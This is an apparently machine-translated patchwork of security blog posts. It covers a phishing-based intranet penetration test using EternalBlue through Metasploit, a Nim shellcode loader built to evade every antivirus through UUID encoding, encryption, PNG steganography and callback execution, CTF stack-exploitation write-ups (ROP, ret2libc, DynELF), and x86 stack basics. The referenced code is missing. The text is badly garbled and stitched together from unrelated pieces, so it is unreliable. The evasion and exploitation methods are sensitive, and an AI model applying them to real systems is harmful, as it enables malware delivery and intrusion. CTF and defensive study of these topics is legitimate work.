Compilation instruction detection: detect the current binary MachO file and determine whether to use PIE,arc, etc.

Code security detection: analyze the current binary file to determine whether to use the encryption function, advertising ID function, C function, sensitive API, etc.

Virus detection: To detect whether the APK has malicious behavior, with the help of a three-way platform

Sensitive function detection listens on privacy functions to judge whether the collection of privacy information conforms to the explicit scope of the privacy policy. It is divided into two parts: establishing matching rules, generating function module, the privacy corresponding rule library to determine the type of information collection, and whether the rule library can be matched.

I will be using Kali Linux as the attacker machine for this learning.

The techniques used here are used only for learning and educational purposes, and the station and the authors are not responsible if the techniques listed are used for any other objective.

During the penetration period, the behavior and project of the penetration test must be granted permission by the penetration party before the penetration test operation can be conducted.

Now there is a dayu company that needs to mine its business and the overall internal network framework system. I grant permission to penetration test dayu. After signing the authorization of both parties, I embarked on a penetration journey to dayu.

Jump away, I this article is the Intranet penetration chapter, through my column: then I passed various ways of social workers fishing, the fishing files for free, successfully fishing to the company's peripheral personnel computer, and controlled the computer permission to obtain shell, and successfully log on to the other party's computer.

Through the early domain users of information collection, draw the corresponding simple network topology, the next step needs to attack subdomain controller, thinking as follows: through the idea of attack, there is another idea: penetration personnel favorite system has kali, and all kinds of windows integrated arsenal system, through the last hidden communication tunnel technology has established a tunnel in the inner domain forest, today we come to subdomain controller, summarize the actual combat will encounter various methods, using these methods to travel in the Internet.

Without improving the permission technology, further penetration of the intranet machine cannot be possible.

In the information collection phase, the known subdomain control xiyou.dayu.The com survival, then the most classic loophole in the actual combat innet is the eternal blue.

In April 2017, the cybersecurity sensation was undoubtedly a large number of disruptive hacking tools used by the National Security Agency (NSA) Formula State Organization (Equation Group), including exploit tools that can remotely breach about 70 percent of Windows servers.

Overnight, 70 percent of the world's Wndows servers were at risk, and domestic universities, enterprises and even government agencies that use Windows servers were not spared.

This is undoubtedly a "big earthquake" on the Internet, because there has been a long time since a level of loopholes like "MS17-010" (MS17-010).

Mtsploit is one of the most useful audit tools available today for security professionals!

MSF is the Metasploit architecture. After understanding, the MSF framework can use external security tools to cooperate with the internal plug-ins in linking the basic library files. The basic library file has a functional program to generate the backdoor shell and an interface to open the MSF function

The MSF file system can view the details of 12 related Eternal Blue (MS17-010) vulnerabilities through Kali, and the utilized module also details the vulnerability in the system of XP~2008R2. The current attack subdomain controller is not clear what system is after information collection, so try the travel sense of the attack!

Offensive Subdomain Controller 1) MSF mount agent MSF has its own mount agent function, requiring only two commands to mount the tunnel agent channel established on the VPS to the Kali-MSF for lateral penetration!

nim-lang: UUID shellcode execution(kills all soft) Nim (originally called Nimrod) is a command-based static type programming language that can be compiled into C or JavaScript.

It is open source, actively maintained, and combines successful concepts from mature languages (such as Python,Ada and Modula).

Nim is efficient, generated a small execution file, compiler support all platforms, perfect for embedded hard real-time systems, support various back-end compilers, etc., Nim's powerful macro system and independence, next will introduce how to use Nim combined with some unabused winapi for kill free.

The first step of process analysis is creating and assigning the heap memory HeapCreate function prototype as above, here the first parameter must be "HEAP_CREATE_ENABLE_EXECUTE", otherwise the system throws EXCEPTION_ACCESS_VIOLATION exceptions when we try to execute code in the memory block from the heap.

The other two parameters can be set to 0, where the dwMaximumSize is 0, which indicates that the heap memory size is limited to the memory size available to the system.

Next, allocate memory on the newly created heap using the HeapAlloc function.

This test used dwBytes of 0x100000, of 1MB of memory.

The second step, planting the shellcode into the heap memory, uses the UuidFromStringA function here.

First, we used the UuidToStringA function to turn the shellcode into a string UUID, runtime and then proposed it using UuidFromStringA to put it into the heap memory allocated in the previous step.

The third step, triggers the execution here with the EnumSystemLocalesA function, the prototype as in the figure above.

I mentioned in the previous two articles: Shellcode Injection via Callbacksnim-lang kill-free test: callback function and cryptography. Here you specify callback functions through the lpLocaleEnumProc parameter, which can achieve similar effects.

Turning bytes to string UUIDpython version is simple using python implementation and turning shellcode bytes to string GUID. as below

Here is the UuidToStringA function which works to turn binary UUID to string UUID.

So how can you turn the bytes to a binary UUID.

The above code output: GUID (Data1:527731695, Data2:18460, Data3:65025, Data4: [139,52,174,72,1,247,153,255]) UUID is a string generated by 4 hyphens (-strings separating 32 bytes (-), a total of 36 bytes long.For example: 550e8400-e29b-41d4-a716-446655440000.

GUID is a Microsoft implementation of this standard of UUID.

The UUID is defined by the Open Software Foundation (OSF).

UUID has various other implementations, more than one for GUID.

Its definition is also seen in the winim module: The full code is compiled below: nim c convertToUUID.Use of nim: convertToUUID.exe beacon.The bin generated string UUID stays until the current directory uuid.In the txt file.

You will find 50 kill soft only 1 identified problems, but what I want is all green.

So it was decided to encrypt string UUID, using AliR test here (eventually all green, see "virscan scan Results II").

When a sample is uploaded to virscan or virustotal scan, it means that it is quickly escape, with a learning mentality.

Runtime again the shellcode is extracted and eventually injected into the shellcode. through a callback

But there's no intelligence wrong: reading the code shows that it is actually hiding the lowest two bits in the R G B A per pixel of the PNG picture, so one pixel can hide 8 bits, or 1 byte of data.

Another pit is how to identify how much data is embedded and ultimately decide to save the size of the embedded data with the first 8 bytes.

This part of the code remains in lsb.In the nim.

Decrypt part, using a AES256-CTR, reference to OffensiveNim's encrypt_decrypt_bin.The nim generates the encrypted picture compile lsb.nimnim c -d:realese --opt:size --cpu:amd64 lsb.The nim generated encrypted picture restore file compares the restored file and the original file found hash consistent, correct.

Injection shellcode indicates: the local test has updated the windows 10 defender to the latest.

There are 17 methods to inject shellcode through a callback and runtime selects one with the opportunity.

The code is output Hello World after receiving an output, a closer look will find a system function is very clear.

When the read function receives the system function can be seen in IDA, buf distance from EBP is 0x80, but this is a 64-bit program, an EBP is 8bytes, so payload:p32 is pack32.

The method of converting the h e x value of the address to the 32 small-end address storage to send the script is as follows: Run the script to get the shell2, level10x00.

The first solution uses the protection mechanism of the pwntools's own tool checksec viewer, and found that the interpretation of the protection mechanism that NX disabled, can write the assembly statement directly on the stack to achieve the purpose of overflow:

Basic idea: Here, printf gives the first address of the buf, so you can fill in the first address of the received buf, and write the data to it with the asm module, which is also the module brought by pwntools

Method: After running, you can see that the value of the printed address is the first address of the buf. When we receive the buf_addr received here with pwntools, we must undergo an int16 decimal conversion (int (buf, 16)) to send it with the p32 package.

This method is a general method, which is to use dynelf's method to dynamically leak the address of the system function, remember this method first, and talk to dynelf.

Conditions used: stack overflow, Input and output function (gets, puts, read, write), no PIE protection here for stack overflow at the first input point, The leak gives the address of the system function and returns the main function here the leak function calculates the base address of the libc, And look up the libc library to leak the address of the system function call the read function to the bss writable field write / bin/sh string, Then call the system to get the shell here using the gdb s vmmap method to find the writable paragraph, Using the later data segment is not error-prone.

2、The level2main function vulnerable_function function has a stack overflow, and you can call the system function directly, and the search string also finds a / bin/sh string.

Thoughts: overflow to the return address modified to the system function with the parameter / bin/sh string.

The distribution of the stack: the last script is an invalid filled return address, here we call the system function. Without this address, use e l f search method to search for the string, the next method takes the first matching string here the ELF method can print the address of the function in the basic plt, got table, so we do not need to find it manually.

You can also write the / bin/sh string to the writable field via the read function, the idea is to call the r e a d function to write characters, then return the main function and then write the system function into the stack which is used in the absence of the / bin/sh string.

Here is the read, write function but no system function this question is given to the libc library so this question is the getshell idea using compare standard got tables to leak the system function.

Using the write function to take the w r i t e address in the got table as a parameter, call the write function in the plt table, get the base address plus the offset of the system function in the program, you get the actual address of the system function.

Use the ELF function to get the address of the plt, got table.
Construct payload Since the address of the plt_write here is to pass the jmp statements into the stack and later with three parameters you require pop tritimes in order to balance the stack.

minus the offset of the write function in the libc library to find the base address of the write function: use the ldd command to find the name of the libc library and then find the relative offset position of the function with the readelf method.

Constructing the system function and calling payload1, is to call write (1, write function address first.

The first parameter file descriptor equal to 1 indicates the output, 4 Represents the length of the output, In the middle is the output, Returns the main function after the call is complete, After getting the base address, prepare for the address of the system function, leak the l i b c address of the write function, Thus calculating the base address of the libc, After sendline returns the result of the running script for the main function leak of the system function: call the system function after input input to find the location of the string / bin/sh in the libc library (note here is the offset address), Can be found directly in the IDA.

You can also use the search method mentioned above, according to the base address of the libc, and get the address of the system function and / bin/sh string. After the sendline gives the payload, the system function will finally pause the running script with the sleep function.

Code idea: This question is almost the same as the level3 above, but this question does not give the libc library, so used here the DynELF, in the pwntools toolkit uses the DynELF tool to leak the address of the system function, then write the "/ bin/sh" string to the bss field, and then call the system function.

For remote symbol leakage, you need to provide a leak method, simply replace the address of the got table that needs to be output with the address of the system function according to the previous idea, the normal writing method is the w r i t e address obtained by the leak address of the write function.

Using the leak method leaks the address of the system function and the script downloads the address of the corresponding l i b c library system function from the github.

Call the read function to fill the / bin/sh string to the bss field, here so as not to affect the normal execution of the program.

Then the system function is called directly, the incoming parameter is the address of the / bin/sh string, and after sending the payload, the string running script with the sendline content of "/ bin/sh" is taken to the shell.

Where the parameter argc is an integer that means that several parameters are passed when running the program with the command line; argv[] is an array of pointers to store a pointer to your string parameter, each element pointing to one parameter.

Where argv[0] points to the full path name where the program is running, the name of the program, such as in the example./a.out,argv[1] points to the first string after executing the program name on the command line, and so on.

But then it seems like the libc_argv[0] is not controllable, or can only use the modified program name for control.

Continue on such a small experiment and look at how the error message is printed (as to why 50 bytes are output and then explore).

To sum up, this stack protection, based on the error reporting class, is exactly the error reporting method, so there is a bypass method of stack smash.

So you must set the following environment variable LIBC_FATAL_STDERR=1 to pipeline and output the standard error information to a remote shell.

To get the value of the flag, you have to get the address in the stack of the buf, because of ASLR, the base address of the libc is leaked first to calculate the address of the buf in the loaded stack according to the offset.

But now the question is to get the loading address of the libc how to calculate the loading address of the stack because the length of the two apart varies each time you load.

The solution is to find a reference that keeps the offset of the load address of stack, or the stack address offset of buf, that can calculate the actual load address from existing conditions.

Add: I save a function called environ, in the libc Save is the environment variable of the current process, The location that the environ points to is the address of the environment variable in the stack, Where the address of the environ = the offset of the l i b c base address + _ environ, That is, in the memory layout, They belong to the same segment, Relative position remains unchanged after ASLR opening, Offset is related to libc libraries, The offset of the environ address (& environ) and libc base address is not, And the value in the environ memory unit is the address of the environment variable in the stack, Based on this address.

In this way, the relative position of the value of the environ in the stack and the stack address of the buf is fixed, and can be fixed according to the stack address of the environ value-offset =buf.

Then the three inputs in the program are: for the first time, the calculation of the l i b c base address is obtained by leaking the got table content of the function.

The second time, & environ, obtained environ values by libc base address and offset calculations.

The third time, by the value of _environ, the stack address of buf is calculated, revealing the value of f l a g stored in buf.


partial write is taking advantage of this, memory is to page loading mechanism, if open PIE protection, can only affect a single memory page, a memory page size is 0x1000, then means that no matter how the address changes, the command of the last three hexadecimal address is always unchanged, so we can cover the last few of the address to control the execution flow of the program.

In addition, partial overwrite can be used not only on the stack, but also in other randomized scenarios.

For example, the randomization of the heap, because the heap start address must be 0x00 in a low byte, you can also control the offset on the heap by overlaying the low level.

Then start constructing flag because gets function reads an end character of \ \ x00 at the end and so the address after overlay is this but this faces a problem.

There is still a PIE protection turned on.

So how do we see if there is an R W X memory page in an ELF file?First we can use the IDA shortcut Ctrl + S or the same tutorial in the static analysis and debugging to check the program with RWX segments.

Of course, since the program may call mprotect() in running, functions like mmap () dynamically modify or allocate memory pages with the RWX attribute.

Since attackers can think of writing shellcode and executing in the RWX segment memory page and executing, defenders can, so a technology called NX bit (No eXecute bit) appears.

This is a security technique implemented on the CPU, and this bit classifies the memory pages in two ways: data and instructions.

Data on a memory page (such as a stack and a heap) marked as data pages cannot be executed as instructions, that is, there is no X attribute.

The previous way of writing the shellcode execution directly to memory is obviously ineffective because of this protection method.

Therefore, we need to learn a well-known bypass technique ——ROP (Return-Oriented Programming, return oriented programming), as the name suggests, ROP is a technique using the return instruction r e t connection code (similarly using the jmp series and call instructions, sometimes becoming JOP/COP).

A function must exist in a program, and a function has a ret instruction.

We know that the essence of the ret instruction is that pop eip, jumps the top of the current stack as a memory address.

And ROP is to arrange a series of memory addresses on the stack using stack overflow, each memory address corresponds to a small paragraph of assembly instructions ending with ret/jmp/call and other instructions, and performs a certain function by jumping one after another.

Since these assembly instructions already exist in the instruction area and can certainly be executed, while we write only memory addresses on the stack and belong to the data, this way can effectively bypass NX protection.

Using ROP to call a function in the got table first we look at a simple R O P under x86 we demonstrate how to call a function present in the got table and control its parameters.

It is obvious that there is a stack overflow in the main function: the first address of the variable v1 is at the bp-28h, namely, the variable is on the stack, and the input is not limited to the length, so our too long input will cause a stack overflow.

The program opens on NX protection so obviously it s impossible for us to open a shell. with shellcode

Based on the ideas of the previous articles, it is easy to think of calling the system function execution.

So where can we find it and it from?The first problem, we know that if we import library functions using dynamically linked programs, we can find the items corresponding to the functions in the GOT tables and PLT tables (we will explain them in detail in a later article).

Jump to.got.The plt segment, we find that the system function is imported into the program.

After solving the first problem, we need to consider the second problem.

By searching the program we don t find the string but there is in the program and we can call this function to read the string into the process memory.

Here we will start building the ROP chain.

First we consider which the string should be put.

By pressing the Ctrl + S shortcut to view the program's memory segment while debugging, we see that starting with a readable and writable address greater than 8 bytes and that address is not affected by ASLR, we can consider reading the string here.

Another parameter we found next, located next we used pwntools functionality to get the address in the PLT table with a s t u b code that hijacks the E I P into the PLT table item of a function where we can directly call the function.

We know that for x86 applications, its parameters enter the stack from right to left.

Therefore, now we can construct an ROP chain.

So we need to improve the ROP chain.

According to the description above, we should place an executed returned address between the parameters and the saved EIP.

Given that we also call the system function after calling the scanf read string, we let the return back to the beginning of the main function again after execution to facilitate another stack overflow.

The modified ROP chain is as follows: We debug again and found that this successful call to read the string to the address when the program starts again from the main function.

As the state of the stack has changed, we need to recalculte the number of bytes for the overflow.

Then again using the ROP chain call execution, this ROP chain can imitate the previous one, and the full script can also be found in the corresponding folder, not repeated here.

Let s look at how to call the function in the g o t table using R O P under 64 bits.

We open the file and it s easy to find that the overflow appears in Hello() like the previous example since the program turns on NX protection we have to find the system function and strings.

The program calls a function called t o d a y in the main function and performs then the system function has.

As for the string, although there is no in the program, but we found the "sh" string, which can actually open shellOK, now we have a stack overflow point, system function, string "sh", we can try to open shell.

First, we want to solve the problem of passing on the parameters.

Unlike x86, under x64, the rdi,rsi,rdx,rcx,r8,r9, parameters from left to right enter the stack (depending on the call convention), so we need a way to assign the RDI.

There are many tools to help us find ROP gadget, like the R O P class from pwntools, ROPgadget, rp + +, ropeme, etc.

Here I m using ROPgadget specified binary via ROPgadget--binary using g r e p to find all the required fragments in all the output gadgets here there is a small trick.

First, let's look at what the contents of this address is in the IDA.

We can find that there is no address, yes, next, so will this be because of bug?Don't worry, we choose, press the shortcut key D to convert into the data.

This also verifies again that the assembly instruction is no more than an alias for a string of data that can be parsed as a legitimate opcode.

As long as the corresponding data is executable, there is no problem to be converted into a legitimate opcode,.

Now that we have everything ready to start building the ROP chain.

This time, we directly called the call system instruction, eliminating manually filling the return address on the stack. The script is as follows: debugging, and found that the shell was successful.

But the reality is that in many cases the target program does not import the system function.

In this case, we need to achieve the goals by other methods.

In this section, what we first learn about is through the ROP call, already introduced in the System call section of the last article, and now let's look at the examples.The main function of this program is in the implementation.

This function has a lot of puts() and printf() output tips requiring us to enter three strings of first_name,last_name and major into three global variables and then choose whether to join Corps of Cadets.

Whether you choose or not, you will go into a similar function, we can see that only you select option 2 will call the function change_major(), and the other options just print out something.

After entering, we found a stack overflow: when we found the overflow point, we can start thinking about how to getshell.

As said at the beginning, the system function cannot be found in this program.

But we found an available review with ROPGadget--binary pwn5 | grep "int 0x80" on the last article that we know at http://syscalls.kernelgrok.The sys_execve call can be found on com / and can also be used to open shell, This system call needs to set 5 registers, where we can enter into the global variable with a fixed address.

Next we have to search through ROPgadget.

We replace gadget with this modified script found successful getshell0x03 Find gadget from a given libc Sometimes pwn topics also provide a corresponding version of libc. in a pwn environment

In this case, we can get the calculated offset for the system and "/ bin/sh" addresses and call them by leaking the actual address that some content in the libc is in memory.

The example of this section is the.This is a relatively simple topic, in addition to the three options shown in the topic there is a hidden option 4, option 4 will directly print the system function in memory first address: from the IDA we can see the printing address after executing the function debug_func(), into the function debug_func() we found the overflow point because the topic to libc, and we have leaked the system memory address.

Use the command readelf-a to view the libc.so.6_x64 From this picture.The text section (Section) belongs to the first LOAD segment (Segment) with the same file length and memory length, that is, all code is mapped to memory and the relative offset between codes does not change.

Since the two previous PHDR,INTERP segments are also as-like maps, the address offset seen in the IDA is the same as the runtime offset.

For example: in this libc the system function first address is 0x456a0, That is, 0x456a0 bytes from the beginning of the file to the system function debugger, Found that the system in-memory address is 0x7fb5c8c266a00x7fb5c8c266a0-0x456a0 =0x7fb5c8be1000\u202c according to this fact, We can get the first address that the libc loads in memory through the function address in the leaked libc, This jump to the first address of other functions and perform.

The first gadget is often known as the universal gadgets, usually located in the E L F program of x64, as follows: This picture contains two gadget, s we know function transfer in the ELF program of x 64, usually, the order is the stack, in the above three gadgets, the first paragraph can be set, the third paragraph uses the set register set rdi, the second set rsi,rdx,rbx, and finally use call any address of c a l l.

You can use this gadgets to quickly construct the ROP chain when difficulty in finding gadgets.

Note that you need to be set up when working with a universal gadgets, since then it is.

Since we usually make rbx=0 so, so the r b x necessarily becomes 1 after the call instruction ends.

If then the jnz does call again which can cause a segment error.

This program has no stack overflow whose code is very simple from the code in the red box we see that the address rbp + var_8 is used as the second parameter assigned to rsi where the input is saved here.

Then the content in rbp + var_8 is assigned to rax, and again to rdx, and finally by execution.

That is we enter a number that will be called using c a l l as an address.

Since we can only control 4 bytes, we need to use one gadget RCE to step getshell.

We find some gadget: via one_gadget and we see that these gadget have constraints.

We chose the first one, requiring rax=0.

It is suggested that ctfer master some of the following first when reading this article, because these things are necessary for you to ctf competition.

Basic python development ability This python development ability involves knowledge point practical practice: P W N comprehensive practice (1) (CTF PWN advanced training combat, try to overflow a URL decoding program.

Computer Bytes and shell charm When I first came to cybersecurity programming, I already found that development was actually an art, and that researchers needed a high level to be competent for this job, because many times you need various fields of knowledge to combine.

for instance.C language, assembly, stack, using python to exploit vulnerabilities, etc., of course, these are just the tip of the iceberg.

This may be difficult for a Xiaobai who has just entered the vulnerability exploit development field, because it is a process of accumulation from scratch.

We download the binary and check it: using the file command.

The command allows us to view the details of the binary, including its architecture, the number of digits (x64 with x32) and lots of other details.

From the content we can see from the output that the file is a 32-bit E L F file of the x86 architecture and is statically linked.

Let s open the binary in ida and check the code This s probably the shortest file I ve seen with only 4 instructions for the whole program.

We perform two pop instructions from the stack, take the value from where the e d x points, and jump to it.

But wait........There are no calls made in this program, so which values pop up from the stack?Let's just check it out with the gdb!Take a look at the stack and we see that eax will receive the value of 1, while e d x will receive the pointer to that string "/ home/user/CTFs/Pwnables/tiny_easy/tiny_easy", This is the path to our binary!If we continue until calling edx we understand why we received the segment error before.

This program tries to jump to the value of the address 0x6d6f682f,, the corresponding string "/ hom".

It is part of our binary file path.

We continued to run our program with the parameters of test1 test2 test3., respectively

We can do this by running the following command in the gdb.

To be able to successfully jump to the desired location, we need to control the value of the argv [0].

How should we control the argv [0] if it was not the parameter we entered?Here is a grand introduction in the magic library file- -pwnlib,Pwnlib is a python library that enables us to communicate easily and with processes.

pwnlib.tubes.process allows us to create our own process and control its different parameters (argv,envp), etc.

I compiled the following snippets to show the simple use of pwnlib: int main (int argc, char * argv []) \ u200b {{u200b \ u200b printf ("\ this is our argv [0]%s \", argv [0]); \ u200b} when I compiled running it.

The next step is to check the security properties of this binary, let's run the checksec command to see the effect: RELRO: has no RELRO protection here; stack: no stack canary mechanism found; NX: NX is disabled; PIE: no PIE; Note: By default, ASLR is enabled in the stack.

NX protection is a protection mechanism that does not allow us to run the code in the binary code parts which means we cannot jump to the code on the stack or stack to run them.

In this example we can see that this binary is compiled without protection which means we can jump to the code on the heap.

Here's important to emphasize that if you check this kind of protection directly in the first place, the whole process will save you a lot of time.

In this example, because we cannot control the returned address and NX is disabled, our best choice is to concentrate on finding a way to jump onto the stack and perform the shellcode. we stored in a certain parameter

Also, on the other hand, if the NX is enabled, then that means we can't jump to the stack, and we need to find a different way to run our code (many other methods like ret2libc).

Now we can control where we want to jump while we need to deal with ASLR in the stack layer has already been enabled.

We can try to find an instruction that allows us to jump to the stack and then run the remaining bytes in our shellcode, program as part of the e l f header.

We can also view the instructions for these bytes in the I D A using the "C" shortcut.

It appears that the instruction which we would best use is the "jmp esp".

This instruction will jump to the stack where we are able to get the shellcode. that we store in the parameters

I like to search manually so I use online disassembling to find out which operating codes the jmp esp instruction consists of.

If we try to decomassemble jmp esp, then the result is: ff e4 We tried to search for this byte in the I D A using search-> bytesequence.

We tried to find an instruction that made us jump to the stack without knowing the address, but we didn't find any instructions.

I tried another SAO operation: jump to an instruction that allows you to write bytes to the code section.

You can try this method by overwriting the address of one of the instructions with the jmp esp operating code, and then jump to its address.

The process is like running a train, building tracks while driving.

The code section enables only the R and X permissions R-Read permissions X-Execution Permissions W (write) permissions are disabled.

This means that if we overwrite the instructions in the code section, the program collapses.

I ve been using this program for hours and tried different methods to jump instructions but I can t find a way to get into the stack.

I found the following explanation: "For 32 bits, there are 2 ^ 32 (42,494967296) addresses, however, the kernel allows only half the bits (2 ^ (32 / 2) = 65,536) to be executed in virtual memory".

This means that the stack can be resized to 65,536 bytes.

If we can control the tens of thousands of shellcode bytes then we can try to jump to a fixed address in the stack with a high success rate.

Below I checked if I can send a lot of parameters with long strings.

We can pass our parameters to fill up the nops and finally send our shellcode.

This way we can jump to a random address on the stack and hopefully be able to fall on our nop instruction and then we will slide all the way to our shellcode.

I wrote the following code and tried executing the program.

We try here to jump to a constant address on the stack, which was chosen for two reasons.

In this program I noticed that this address spent most of the time in the range or very close to the stack after performing many times with gdb.

Note that we need to change the command we execute from "echo we_made_it" to "cat /home/tiny_easy/flag", to get the flag.

We can easily upload our script using the "scp" command to the tmp directory of the server just like this.

Finally, we understand why A S L R in 32-bit systems is vulnerable due to the small random range, and how this vulnerability is exploited to attack.

How to getshell analyze the GCC default parameters compiled with (install the pwntools with) to check the protection mechanism of the program, found that only the NX stack execution protection is opened by default, that is, we can't insert the shellcode directly into the stack to execute.

We checked it out.In got also found no system function, because our program was useless, of course, there is a way, we see can use directly call system call (about this can consult relevant information, then in detail, here is a train of thought), after executing the following statement found that not this statement.

No system, in the program?have a shaft left in one's quiver!Otherwise, I can't continue writing this article.

We know the above code, containing the standard library, introduces the sum functions.

So where do these functions come from?So it comes to the dynamic link library of the program, yes, under windows, it is the well-known file, and under Linux, the dynamic link library is the file.

This program is also run with a dynamic link library, so we's see if we can be looking for something.

getshell thinking then we are at libc.In the so, look to see if there is a string we want, after searching, I found that there is really some, but every time the dynamic library loading address is different, so how to get its real address?The answer is by offset. Although the dynamic library loads at a different address, he is the same relative to itself.

We can take libc_2.12.so out to look at his offset or we can directly calculate what his offset is, with the Address of the string minus libc.The B a s e of so,

A common method is to use got table leaks, which output the content of the got table item corresponding to a certain function, but note that only the executed function is bound to the libc.

Here we leak the address that the program runs time and will execute it first.

Since the return address in the Payload we construct or the stack_overflow() function.

Next we have the preconditions and continue to construct the Payload in the figure below, which we exploit successfully.

In principle remember the two examples of the last two articles, we are through the stack overflow to overwrite the return address, so that the process of the program to jump to the constructed backdoor function, then stack pivot, is the hijacking stack pointer to the memory that the attacker can control, and then ROP in the corresponding position.

Section register: In the 8086 system, the address code of the access memory consists of a segment address and an in-segment offset address.

The segment register is used to store the logical base values of each segment and indicates the 4 logical segments currently in use, including Code segment register CS, Stack segment register SS, Data segment register DS, and Additional segment data register ES.

The 32-bit CPU has 6 segment registers, as follows: CS: Code segment register ES: Additional segment register DS: Data segment register FS: Additional segment register SS: stack segment register GS: Additional segment registers in the 16-bit CPU system, only 4 segment registers (CS, DS, ES, SS) address register The 32-bit CPU has 232-bit universal registers ESI and EDI, whose low 16 bits correspond to S I and D I in 8086CPU, the access to low 16-bit data, does not affect the high 16-bit data.

The esi, edi, si and d i are called variable address registers, which are mainly used to store the offset of the storage unit within the segment, with which multiple memories can be realized.

The pointer register 32-bit CPU has 232-bit universal registers EBP and ESP whose low 16 bits corresponding to B P and S P in the previous CPU has access to low 16-bit data and does not affect the high 16-bit data.

EBP, ESP, BP and SP, called pointer registers, are mainly used to store the offset of the storage units in the stack, with which many kinds of memory can be realized.

The e b p is a base pointer register, used to directly access the data in the stack.

The e s p is the stack pointer register with which only access the top of the stack.

The instruction pointer register 32-bit CPU extends the instruction pointer to 32 bits and notes that the low 16 bits of the EIP,EIP have the same I P action in the previous CPU.

The instruction pointer EIP, IP is the offset address that stores the next instruction to be executed in snito code.

The registers%ebx,%esi and%edi save the registers (callee-saved registers) for the tuned function, meaning that when the tuned function overrides the values of these registers, it must first press the register original value into the stack and restore its original value from the stack before the function returns, as the master tuned function may also be using these registers.

Furthermore, the called function must keep the registers%ebp and%esp and restored to the value before the function returns, where the stack frame of the main call function must be restored.

The assembly instruction movmov%esp,%ebp assigns the stack top pointer%esp of the master tune function to the tune function frame base pointer%ebp.

this moment, The%ebp points to the starting address (bottom of the stack) of the new stack frame of the called function, The stack top push & pop correlation register after the old%ebp enters the stack: esp, Actions related to ebp: pop, pushpush: Stack push%eax stack top pointer ESP reduces 4 bytes; Register data in bytes (four bytes, Insufficient fill zero) pressure into the stack, Saving data into the ESP-1, ESP-2, ESP-3, ESP-4 points to the address unit is equivalent to: pop: Out of the stack pop%eax stack top pointer ESP points to the stack where the data is taken back to the register;

Stack top pointer ESP adds 4 bytes call&retcall 0x111 presses the current instruction pointer EIP (the pointer points to the next instruction immediately after the call instruction) into the stack to restore the execution of the next instruction when returned;

The EIP is then set to point to the start of the called function code to jump to the entry address of the called function to perform the ret cooperating with the call instruction to return from the function or procedure.

From the top return address (the next instruction address saved by the call instruction) to the EIP register, the program goes to that address to continues (when ESP points to the first parameter in the entry function).

Before using this instruction, the contents of the current stack pointer is exactly the returned address saved by the previous call instruction.

enter&leaveenterleave restores the stack frame of the master tune function to prepare for a return.

Equivalent to the instruction sequence movl%ebp,%esp (restoring the original ESP value, pointing to the beginning of the called function stack frame) and popl%ebp (restoring the value of the original ebp, namely the main call function frame base pointer) sub subtracted the stack top pointer%esp from the specified number of bytes (stack top down), which opens up the stack space for the local variables of the called function.

For integer times of immediate and usually 16 (perhaps slightly larger than the total number of local variable bytes, but gcc uses this rule to ensure strict alignment of the data to efficient use of various optimized compilation techniques) the stack introduction stack is a typical state-of-the-art out (First in Last Out) data structure, mainly by press stack (push) and out stack (pop).

Both operations operate stack top and of course it has stack bottom.

Each program has a virtual address space at runtime, a part of which is the stack of the program corresponding to save the function call information and local variables.

In addition, common operations are also stack with the stack.

The execution of the function call stack program can be regarded as continuous function calls.

When a function is executed, the program returns to the next instruction of the call command (immediately following the c a l l instruction).

The function calling process is usually implemented using a stack, and each user state process corresponds to a call stack structure (call stack).

The compiler uses stack transfer function parameters, save the return address, temporarily save the original register value (i. e., the context of the function call) for recovery and storing the local local variables.

Stack growth direction: High address-> low address call way cdeclstdcallfastcall parameter passed from right to left from right to left stack left to left two parameters placed in ECX and EDX register, the rest of the parameters from right to left stack cleaning the caller function itself function itself stack frame function call is often nested, there will be multiple function information in the stack.

Each unfinished function occupies a separate continuous area, called a stack frame.

Stack frames are logical fragments of the stack that are pressed into the stack when the function is called, and popped up from the stack when the function returns.

Stack frames store functional parameters, local variables, and data needed to recover the previous stack frame.

The compiler utilizes stack frames to make it clear about the allocation and release of local variables in the functions.

Before the compiler turns control to the function itself, inserting specific code presses the function parameters into the stack frame and assigns enough memory space to store the local variables in the function.

Each recursive call of a stack frame to a function is assigned a new stack frame to the function that cleverly isolating the current call from the previous call.

The boundary of the stack frame is defined by the stack frame base address pointer EBP and the stack pointer ESP.

The EBP points to the bottom of the current stack frame (high address), fixed in the current stack frame; the ESP points to the top of the current stack frame (low address), and the ESP moves with the data in and out of the stack.

So the access to most of the data in the function is based on EBP.

Function call When calling a function, the system assigns a stack frame to which the stack frame space is unique to that function.

The caller call a function is roughly as follows: the function parameters from right to left into the stack, return the address into the stack, the previous function ebp into the stack in the stack, opened up the new frame of the stack function, the next is the temporary variables into the stack, if the call function continue to call the new function, will continue to start the above series of operations, cycle nested.

The following figure represents the layout of the stack during the function call.

The change at the end of the function call is mainly to pop up the data stack in the opposite order: the temporary variables, the e b p value of the call function, save it in the e b p register, pop up the return address in the e i p register. The return address is the address of the next instruction when calling the function with the c a l l instruction, stored in the e i p, and the program continues to execute the next instruction.

The most important step in creating a stack frame with a function call convention is how the master tone function passes the function parameters to the stack.

The master tuning function must store these parameters precisely so that the tuning function can access them.

A function indicates that it wants to receive parameters in a particular way by selecting a specific call convention.

Moreover, when the call function completes the task, the call convention stipulates that the parameters previously entered the stack should be cleared by the main call function or the call function to ensure the integrity of the stack pointer integrity of the program.

Order and mode of function parameters: The most common mode is through the stack.

The master tuning function presses the parameters into the stack, and the tuned function visits the parameters in the stack with a positive offset relative to the frame-based pointer.

For functions with multiple parameters, the call convention specifies the order in which the master tone function stacks the parameters (from left to right or from right to left).

Some call conventions allow parameter transfer to use registers to improve performance.

Maintenance mode of the stack: the main call function calls the called function body after stacking the parameters, and all the parameters of the stack should be pop up to restore the stack to the pre-call state.

The stack clearing process can be done by the main tuning function or by the adjusted function.

Name-mangling policy: also known as the function name modification (Decorated Name) rule.

The compiler distinguishes between different functions when linking, and makes different modifications to the famous functions.

Mismatching of the call conventions between functions can cause problems such as stack exceptions or link errors.

Therefore, to ensure that the program performs correctly, all function calls follow consistent call conventions.

A want to get started pwn garbage ctfer, where wrong or understand wrong also ask the big guys to point out.

2, makes the file compression smaller.

3, protects the antivirus software installer from the virus.

3、Trojan, virus protection shell, make it difficult to break and many shell than upx manual unshell is relatively simple.

1.The program function is to enter name and then passcode1,passcode2, into the equivalent of a username, two passwords
2.main continuous execution welcome,login, no push,pop, intermediate e b p the same 3, s c a n f in login() receives the input, the passcode1,passcode2 did not add & take the address, and because the passcode1,passcode2 is not initialized, so we scanf input data, where the data is unknown, just know the data was saved to the address that the value of the passcode1,passcode2 points to.

